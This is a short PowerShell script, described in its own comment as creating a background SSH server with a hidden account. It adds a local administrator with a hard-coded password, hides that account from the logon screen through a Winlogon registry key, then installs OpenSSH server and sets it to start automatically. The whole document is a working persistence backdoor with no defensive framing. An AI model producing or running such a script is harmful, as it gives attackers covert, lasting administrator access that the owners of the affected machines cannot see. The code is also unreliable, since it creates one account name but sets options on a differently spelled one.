# This script will create backround ssh server with hidden account.
$acc = "Acount"
$password = ConvertTo-SecureString "password" -AsPlainText -Force
New-LocalUser $acc -Password $password -FullName $acc
Add-LocalGroupMember -Group "Administrators" -Member $acc
$path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
New-Item $path -Force | New-ItemProperty -Name $acc -Value 0 -PropertyType DWord -Force
Set-LocalUser -Name "Account" -PasswordNeverExpires 1
Get-WindowsCapability -Online | ? Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*
